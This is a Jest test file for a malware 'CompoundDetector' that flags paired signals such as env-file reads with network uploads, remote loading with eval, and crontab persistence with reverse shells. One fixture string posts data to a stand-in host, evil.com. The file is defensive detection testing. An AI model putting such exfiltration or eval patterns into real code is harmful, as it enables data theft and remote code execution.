const { CompoundDetector } = require('../../../lib/validation/detectors/compound');
const { createFinding } = require('../../../lib/validation/engine/findings');

function makeFinding(overrides) {
  return createFinding({
    ruleId: 'TEST', detector: 'rule-engine', category: 'MALICIOUS_CODE',
    name: 'test', severity: 'high', confidence: 80,
    file: 'test.js', line: 1, content: 'test', match: 'test',
    ...overrides
  });
}

describe('CompoundDetector', () => {
  let detector;
  beforeEach(() => { detector = new CompoundDetector(); });

  it('should detect data exfiltration (file access + network upload)', () => {
    const findings = [
      makeFinding({ category: 'DATA_EXFILTRATION', name: 'env file read', ruleId: 'DATA001' }),
      makeFinding({ category: 'DATA_EXFILTRATION', name: 'network POST', ruleId: 'DATA003',
        content: 'fetch("https://evil.com", { method: "POST" })' })
    ];
    const compounds = detector.analyze(findings);
    expect(compounds.length).toBeGreaterThan(0);
    expect(compounds[0].detector).toBe('compound');
    expect(compounds[0].name).toMatch(/exfiltration/i);
  });

  it('should detect rug pull (remote loading + dynamic execution)', () => {
    const findings = [
      makeFinding({ category: 'MALICIOUS_CODE', name: 'Remote Code Loading',
        content: 'fetch config from remote', ruleId: 'RUG001' }),
      makeFinding({ category: 'MALICIOUS_CODE', name: 'eval usage',
        content: 'eval(response)', ruleId: 'MAL001' })
    ];
    const compounds = detector.analyze(findings);
    expect(compounds.length).toBeGreaterThan(0);
    expect(compounds[0].name).toMatch(/rug pull/i);
  });

  it('should NOT trigger when only one signal present', () => {
    const findings = [
      makeFinding({ category: 'DATA_EXFILTRATION', name: 'env file read', ruleId: 'DATA001' })
    ];
    expect(detector.analyze(findings)).toHaveLength(0);
  });

  it('should return empty for empty findings', () => {
    expect(detector.analyze([])).toHaveLength(0);
  });

  it('should detect backdoor install (persistence + reverse shell)', () => {
    const findings = [
      makeFinding({ category: 'BACKDOOR', name: 'crontab operation', ruleId: 'BACK002' }),
      makeFinding({ category: 'BACKDOOR', name: 'reverse shell', ruleId: 'BACK001' })
    ];
    const compounds = detector.analyze(findings);
    expect(compounds.length).toBeGreaterThan(0);
    expect(compounds[0].name).toMatch(/backdoor/i);
  });
});
